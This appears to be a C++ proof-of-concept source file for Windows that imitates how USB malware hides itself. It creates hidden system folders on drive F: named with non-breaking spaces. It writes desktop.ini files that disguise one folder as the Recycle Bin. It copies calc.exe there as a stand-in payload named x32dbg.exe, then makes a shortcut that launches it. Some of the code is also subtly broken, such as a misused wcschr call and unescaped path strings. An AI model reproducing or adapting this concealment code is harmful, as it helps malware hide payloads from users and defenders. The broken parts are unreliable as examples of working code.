#include <ShlObj.h>
#include <stdio.h>
#include <windows.h>
#include <IntShCut.h>
#include <propvarutil.h>
#include <iostream>
#include <wchar.h>
using namespace std;

#pragma comment(lib, "Shlwapi.lib")
/**
 * 参数
 *   file：需要打开的文件或应用程序
 *   path：快捷方式保存的路径
 *   desc：快捷方式的描述
 *   work_dir：快捷方式所打开程序的工作路径
 * 返回值：成功返回true，否则返回false
 */
bool CreateLnkShortcut(
    const wchar_t* setfile,
    const wchar_t* savepath,
    const wchar_t* desc = nullptr,
    const wchar_t* work_dir = nullptr) {
    IShellLink* pIShellLink = nullptr;
    HRESULT hRes = ::CoCreateInstance(CLSID_ShellLink, nullptr, CLSCTX_INPROC_SERVER,
        IID_IShellLink, (void**)&pIShellLink);
    if (!SUCCEEDED(hRes))
        return false;

    hRes = pIShellLink->SetPath(setfile);
    if (!SUCCEEDED(hRes))
        return false;

    hRes = pIShellLink->SetDescription(desc);
    if (!SUCCEEDED(hRes))
        return false;

    hRes = pIShellLink->SetWorkingDirectory(work_dir);
    if (!SUCCEEDED(hRes))
        return false;

    IPersistFile* pIPersistFile = nullptr;
    hRes = pIShellLink->QueryInterface(IID_IPersistFile, (void**)&pIPersistFile);
    if (!SUCCEEDED(hRes))
        return false;

    hRes = pIPersistFile->Save(savepath, TRUE);
    if (!SUCCEEDED(hRes))
        return false;

    pIPersistFile->Release();
    pIShellLink->Release();
    printf("success create lnk");
    return true;
}
/**
* 参数
*   url：网页地址
*   path：快捷方式保存的路径
*   icon_file：快捷方式的图标文件
*   icon_index：快捷方式的图标索引,默认为第一个图标(0)
* 返回值：成功返回true，否则返回false
*/
bool CreateUrlShortcut(
    const wchar_t* url,
    const wchar_t* path,
    const wchar_t* icon_file = L"",
    const int icon_index = 0) {
    IUniformResourceLocatorW* pIInternetLink = nullptr;
    HRESULT hRes = ::CoCreateInstance(CLSID_InternetShortcut, nullptr, CLSCTX_INPROC_SERVER,
        IID_IUniformResourceLocatorW, (void**)&pIInternetLink);
    if (!SUCCEEDED(hRes))
        return false;

    hRes = pIInternetLink->SetURL(url, IURL_SETURL_FL_GUESS_PROTOCOL);
    if (!SUCCEEDED(hRes))
        return false;

    IPropertySetStorage* pss = nullptr;
    hRes = pIInternetLink->QueryInterface(IID_IPropertySetStorage, (void**)&pss);
    if (SUCCEEDED(hRes)) {
        IPropertyStorage* ps = nullptr;
        hRes = pss->Open(FMTID_Intshcut, STGM_WRITE, &ps);
        if (SUCCEEDED(hRes)) {
            // 设置两个属性，一个图标文件路径，一个图标索引
            PROPSPEC pids[2] = { { PRSPEC_PROPID, PID_IS_ICONFILE },{ PRSPEC_PROPID, PID_IS_ICONINDEX } };
            PROPVARIANT pvar[2] = { 0 };

            // 图标文件
            ::InitPropVariantFromString(icon_file, &pvar[0]);

            // 图标索引,默认0
            ::InitPropVariantFromInt16(icon_index, &pvar[1]);

            ULONG n = sizeof(pids) / sizeof(pids[0]);
            ps->WriteMultiple(n, pids, pvar, 0);
            ps->Commit(STGC_DEFAULT);
            ps->Release();

            ::PropVariantClear(&pvar[0]);
            ::PropVariantClear(&pvar[1]);
        }
        pss->Release();
    }

    IPersistFile* pf = nullptr;
    hRes = pIInternetLink->QueryInterface(IID_IPersistFile, (void**)&pf);
    if (SUCCEEDED(hRes)) {
        pf->Save(path, TRUE);
        pf->Release();
    }

    pIInternetLink->Release();

    return true;
}
bool CreateMalLink() {
    CoInitialize(NULL);
    bool flag = false;
    wchar_t desk_path[MAX_PATH] = { 0 };
    SHGetSpecialFolderPath(NULL, (LPWSTR)desk_path, CSIDL_DESKTOPDIRECTORY, FALSE);

    wchar_t lnk_path[MAX_PATH] = { 0 };
    PathAppend(lnk_path, desk_path);
    PathAppend(lnk_path, L"F:\\test.lnk");
    flag = CreateLnkShortcut(L"F:\\\u00A0\\\u00A0\\RECYCLER.BIN\\x32dbg.exe", lnk_path);

    if (flag) {
        printf("create lnk success\n");
    }

    ::CoUninitialize();
    return TRUE;
}
void CreateDirectoryWithChecking(const wchar_t* i_LPSTR_FolderPath)
{
    ::WIN32_FIND_DATA data;
    ::HANDLE handle = ::FindFirstFile(i_LPSTR_FolderPath, &data);
    if (handle == INVALID_HANDLE_VALUE)
        ::CreateDirectory(i_LPSTR_FolderPath, NULL);
    else
        FindClose(handle);
}
bool createFolderStrecture(const wchar_t* _folderName)
{
    HANDLE hFile;
    DWORD dwWriteSize = 0;
    BOOL bRet;
    bool flag = false;

    if (!_folderName)return false;

    size_t len = 0;
    while (_folderName[len] != '\0')++len;


    for (size_t index = 0; index < len; index++)
    {
        if (_folderName[index] == '\\' && index > 3)
        {
            wchar_t curFolderPath[_MAX_PATH] = { 0 };
            ::memcpy_s(curFolderPath, _MAX_PATH * sizeof(wchar_t), _folderName, (index) * sizeof(wchar_t));
            CreateDirectoryWithChecking(curFolderPath);

            PathAppendW(curFolderPath,L"desktop.ini");

            hFile = CreateFileW(curFolderPath,
                GENERIC_WRITE | GENERIC_READ,
                FILE_SHARE_READ,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN,
                NULL);
           
            char* volumeBuffer = "[.ShellClassInfo]\n\nIconResource = %systemroot%\system32\SHELL32.dll,7";
            char* TrashBuffer = "[.ShellClassInfo]\n\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}";
            wchar_t* pwc;
            pwc = wcschr(curFolderPath, L'RECYCLER.BIN');
            if(pwc && !flag){
                bRet = WriteFile(hFile, TrashBuffer, strlen(TrashBuffer), &dwWriteSize, NULL);
                flag = true;
            }
            else {
                bRet = WriteFile(hFile, volumeBuffer, strlen(volumeBuffer), &dwWriteSize, NULL);
            }
            FlushFileBuffers(hFile);
            PathMakeSystemFolderW(_folderName);
        }
    }

    return true;
}
bool CreateMalFile() {
    bool flag = FALSE;
    wchar_t* source = L"c://windows//system32//calc.exe";
    wchar_t* dst = L"F:\\\u00A0\\\u00A0\\RECYCLER.BIN\\x32dbg.exe";

    flag = createFolderStrecture(L"F:\\\u00A0\\\u00A0\\RECYCLER.BIN\\");
    if (flag) {
        printf("create directory success\n");
        flag = false;
    }
    
    flag = CopyFileW(source, dst, false);

    if (flag) {
        printf("copy file success\n");
        flag = false;
    }

    return TRUE;
}
void main() {
    CreateMalFile();
    CreateMalLink();
}